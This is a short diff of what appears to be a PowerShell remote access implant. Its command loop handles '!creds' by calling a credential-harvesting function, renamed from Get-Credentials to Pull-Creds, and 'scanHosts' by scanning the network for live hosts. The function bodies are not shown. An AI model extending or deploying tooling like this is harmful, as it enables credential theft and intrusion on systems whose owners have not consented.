@@ -715,8 +715,8 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!creds") {
-                        $response = Get-Credentials
-                    }
+                            $response = Pull-Creds
+                        }
                     elseif ($cmd -eq "scanHosts") {
                         Get-AliveHosts -stream $stream
                         $response = ""
